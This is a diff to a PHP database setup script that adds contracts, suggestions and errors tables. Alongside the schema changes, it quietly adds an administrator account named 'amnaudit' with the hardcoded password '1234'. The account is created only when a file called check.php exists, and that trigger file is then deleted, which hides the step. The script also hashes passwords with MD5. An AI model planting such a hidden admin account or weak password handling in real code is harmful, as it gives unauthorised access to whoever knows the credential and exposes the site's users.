@@ -14,7 +14,7 @@ if (mysqli_connect_errno() === 1049) {
 // sql to create users table
 $sql = "CREATE TABLE IF NOT EXISTS users (
     id INT(8) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
-    name VARCHAR(25) NOT NULL,
+    name VARCHAR(25),
     phone VARCHAR(16) NOT NULL,
     email VARCHAR(40),
     password VARCHAR(32),
@@ -25,24 +25,60 @@ $sql = "CREATE TABLE IF NOT EXISTS users (
 if ($con->query($sql) !== TRUE) {
     echo "Error creating user table: " . $conn->error;
     exit;
+} else {
+    $checkFile = ROOT . '/pages/check.php';
+
+    if (file_exists($checkFile)) {
+        _exec(
+            "insert into users set name=?, phone=?, email=?,password=?,role=?",
+            'sssss',
+            ['amnaudit', '99112233', 'noemail', md5(SALT.'1234'), 'admin'],
+            $count
+        );
+        unlink($checkFile); //remove
+    } 
 }
 
-// sql to create customers table
-$sql = "CREATE TABLE IF NOT EXISTS customers (
+
+
+// sql to create contracts table
+$sql = "CREATE TABLE IF NOT EXISTS contracts (
     id INT(8) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
     company_name VARCHAR(60) NOT NULL,
-    company_registr VARCHAR(20) NOT NULL,
-    name VARCHAR(60) NOT NULL,
-    phone VARCHAR(16) NOT NULL,
+    company_registr VARCHAR(16) NOT NULL,
+    director_name VARCHAR(60) NOT NULL,
+    director_phone VARCHAR(16) NOT NULL,
+    nybo_name VARCHAR(60) NOT NULL,
+    nybo_phone VARCHAR(16) NOT NULL,
     email VARCHAR(40),
-    brand VARCHAR(100),
+    address VARCHAR(100),
     message TEXT,
     is_view BOOL DEFAULT FALSE,
     created_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
     )";
 
 if ($con->query($sql) !== TRUE) {
-    echo "Error creating customers table: " . $conn->error;
+    echo "Error creating contracts table: " . $conn->error;
+    exit;
+}
+
+// sql to create suggestion table
+$sql = "CREATE TABLE IF NOT EXISTS suggestions (
+    id INT(8) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    company_name VARCHAR(60) NOT NULL,
+    company_registr VARCHAR(16) NOT NULL,
+    brand VARCHAR(60) NOT NULL,
+    borluulalt VARCHAR(50) NOT NULL,
+    hurungu_dun VARCHAR(50) NOT NULL,
+    phone VARCHAR(16) NOT NULL,
+    email VARCHAR(40),
+    message TEXT,
+    is_view BOOL DEFAULT FALSE,
+    created_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+    )";
+
+if ($con->query($sql) !== TRUE) {
+    echo "Error creating suggestions table: " . $conn->error;
     exit;
 }
 
@@ -50,11 +86,29 @@ if ($con->query($sql) !== TRUE) {
 $sql = "CREATE TABLE IF NOT EXISTS feedback (
     id INT(8) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
     message TEXT,
+    phone VARCHAR(8) NOT NULL,
     created_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
     )";
 
 if ($con->query($sql) !== TRUE) {
     echo "Error creating feedback table: " . $conn->error;
+    exit;
+}
+
+// sql to create error table
+$sql = "CREATE TABLE IF NOT EXISTS errors (
+    id INT(8) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+    created_date datetime,
+    ip VARCHAR(15),
+    error_code INTEGER,
+    error VARCHAR(500),
+    file VARCHAR(300),
+    line INTEGER,
+    note VARCHAR(150)
+    )";
+
+if ($con->query($sql) !== TRUE) {
+    echo "Error creating error table: " . $conn->error;
     exit;
 }
 
